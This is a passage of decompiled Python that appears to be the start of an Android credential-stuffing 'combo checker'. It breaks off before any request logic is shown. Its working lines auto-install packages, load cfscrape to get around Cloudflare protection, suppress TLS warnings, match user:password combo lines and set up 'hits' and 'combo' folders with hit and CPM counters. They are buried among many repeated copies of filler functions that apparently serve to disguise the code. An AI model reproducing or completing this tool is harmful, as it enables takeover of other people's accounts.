# uncompyle6 version 3.9.1
# Python bytecode version base 3.6 (3379)
# Decompiled from: Python 3.6.8 (tags/v3.6.8:3c6b436a57, Dec 24 2018, 00:16:47) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: <Moon>
import os, time, urllib.request, subprocess

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)
try:
    import requests
except ImportError:
    print("A biblioteca requests não foi encontrada. Vou baixar e instalar... Por favor, aguarde. :-) \n")
    comando = "pip install requests"
    subprocess.run(comando, shell=True)
    print("Biblioteca requests instalada com sucesso. Prossiga. ( °-°)/` \n")
    import requests

try:
    import platform
except ImportError:
    print("A biblioteca platform não foi encontrada. Vou baixar e instalar... Por favor, aguarde. :-) \n")
    comando = "pip install platform"
    subprocess.run(comando, shell=True)
    print("Biblioteca platform instalada com sucesso. Prossiga. ( °-°)/` \n")
    import platform

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)
import random, time, json, sys, re, base64, pathlib, threading, shutil
from datetime import datetime, timedelta
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
mac = ""
nick = "𓆩 ❦𓆪 ₐₗᵢ ₐₗₕₑ𝕯ᵣₑ⁀➴"
from random import uniform
try:
    import cfscrape
    sesq = requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses = requests.Session()

try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except ImportError:
    pass
except:
    pass

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)
from playsound import playsound

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)
tempo_inicio = None

def cronometrar_tempo():
    global tempo_inicio
    if tempo_inicio is None:
        tempo_inicio = time.time()
    tempo_atual = time.time()
    tempo_decorrido = int(tempo_atual - tempo_inicio)
    horas = tempo_decorrido // 3600
    minutos = tempo_decorrido % 3600 // 60
    segundos = tempo_decorrido % 60
    tempo_total_string = f"{horas:02}:{minutos:02}:{segundos:02}"
    return tempo_total_string


def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def calcular_dias_ate_data_futura(data_futura):
    data_atual = datetime.now()
    partes_data = data_futura.split(" ")
    data_futura = partes_data[0]
    data_futura = datetime.strptime(data_futura, "%d-%m-%Y")
    diferenca = data_futura - data_atual
    dias_faltando = diferenca.days
    return dias_faltando


def dias_restantes(data_futura):
    return calcular_dias_ate_data_futura(data_futura)


ESC = "\x1b["
RST = ESC + "0m"
BOLD = ESC + "1m"
RESET = "\x1b[0m"
NEGRITO = "\x1b[1m"
FRACO = "\x1b[2m"
ITALICO = "\x1b[3m"
SUBLINHADO = "\x1b[4m"
TREMEDEIRA = "\x1b[5m"
INVERTIDO = "\x1b[7m"
OCULTO = "\x1b[8m"
RISCADO = "\x1b[9m"
P = ESC + "30m"
PC = ESC + "90m"
V = ESC + "31m"
VC = ESC + "91m"
VD = ESC + "32m"
VDC = ESC + "92m"
A = ESC + "33m"
AC = ESC + "93m"
AZ = ESC + "34m"
AZC = ESC + "94m"
M = ESC + "35m"
MC = ESC + "95m"
C = ESC + "36m"
CC = ESC + "96m"
B = ESC + "37m"
WHITE_L = ESC + "97m"
VDB = ESC + "1;32m"
PB = ESC + "30;100m"
pattern = "(^\\S{2,}:\\S{2,}$)|(^.*?(\n|$))"
subprocess.run(["clear", ""])
say = 0
hit = 0
bul = 0
cpm = 1

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def print_without_flickering(echo):
    sys.stdout.write("\x1b[2J\x1b[H")
    sys.stdout.flush()
    print(echo)
    time.sleep(0.8)


def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)
caminho_pasta_01 = "/sdcards/hits/AliPre"
if not os.path.exists(caminho_pasta_01):
    os.makedirs(caminho_pasta_01)

def fibonacci_seri(n):
    if n <= 0:
        return []
    else:
        if n == 1:
            return [
             0]
        if n == 2:
            return [
             0, 1]
        fibonacci = [0, 1]
        for i in range(2, n):
            fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

        return fibonacci


def kelime_frekansları(metin):
    kelimeler = metin.split()
    frekanslar = {}
    for kelime in kelimeler:
        if kelime in frekanslar:
            frekanslar[kelime] += 1
        else:
            frekanslar[kelime] = 1

    return frekanslar


def faktoriyel(n):
    if n == 0:
        return 1
    else:
        return n * faktoriyel(n - 1)


def tersine_cevir(dize):
    return dize[::-1]


def toplam_hesapla(liste):
    return sum(liste)


class HesapMakinesi:

    def __init__(self):
        pass

    def toplama(self, x, y):
        return x + y

    def çıkarma(self, x, y):
        return x - y

    def çarpma(self, x, y):
        return x * y

    def bölme(self, x, y):
        if y == 0:
            return "Sıfıra bölme hatası!"
        else:
            return x / y


class Matris:

    def __init__(self, satır, sütun):
        self.satır = satır
        self.sütun = sütun
        self.veri = [[0 for _ in range(sütun)] for _ in range(satır)]

    def göster(self):
        for satır in self.veri:
            print(satır)

    def eleman_ekle(self, satır, sütun, değer):
        self.veri[satır][sütun] = değer


fibonacci_10 = fibonacci_seri(10)
frekanslar = kelime_frekansları("Bu bir örnek metin metin metin")
faktoriyel_5 = faktoriyel(5)
ters_metin = tersine_cevir("Python örneği")
liste_toplam = toplam_hesapla([1, 2, 3, 4, 5])
hesap_makinesi = HesapMakinesi()
toplam = hesap_makinesi.toplama(5, 3)
çarpım = hesap_makinesi.çarpma(4, 6)
matris = Matris(3, 3)
matris.eleman_ekle(0, 0, 1)
matris.eleman_ekle(1, 1, 1)
matris.eleman_ekle(2, 2, 1)
caminho_pasta_02 = "/sdcard/combo/up"
if not os.path.exists(caminho_pasta_02):
    os.makedirs(caminho_pasta_02)
else:

    def fibonacci_seri(n):
        if n <= 0:
            return []
        else:
            if n == 1:
                return [
                 0]
            if n == 2:
                return [
                 0, 1]
            fibonacci = [0, 1]
            for i in range(2, n):
                fibonacci.append(fibonacci[i - 1] + fibonacci[i - 2])

            return fibonacci


    def kelime_frekansları(metin):
        kelimeler = metin.split()
        frekanslar = {}
        for kelime in kelimeler:
            if kelime in frekanslar:
                frekanslar[kelime] += 1
            else:
                frekanslar[kelime] = 1

        return frekanslar


    def faktoriyel(n):
        if n == 0:
            return 1
        else:
            return n * faktoriyel(n - 1)


    def tersine_cevir(dize):
        return dize[::-1]


    def toplam_hesapla(liste):
        return sum(liste)


    class HesapMakinesi:

        def __init__(self):
            pass

        def toplama(self, x, y):
            return x + y

        def çıkarma(self, x, y):
            return x - y

        def çarpma(self, x, y):
            return x * y

        def bölme(self, x, y):
            if y == 0:
